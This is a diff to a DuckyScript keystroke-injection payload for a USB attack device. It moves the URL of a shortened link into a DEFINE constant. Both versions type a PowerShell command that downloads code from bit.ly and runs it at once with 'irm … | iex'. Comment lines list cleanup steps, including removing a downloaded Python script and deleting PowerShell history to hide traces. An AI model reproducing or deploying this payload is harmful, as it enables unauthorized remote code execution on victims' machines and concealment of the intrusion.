@@ -18,7 +18,7 @@ REM 4. Remove Python script downloaded
 REM 5. Delete powershell history
 REM
 
-
+DEFINE POWERSHEL_CODE bit.ly/CloseApplications
 
 DELAY 2000
 GUI x
@@ -39,5 +39,5 @@ TAB
 TAB
 ENTER
 DELAY 2000
-STRING irm bit.ly/CloseApplications | iex
+STRING irm POWERSHEL_CODE | iex
 ENTER
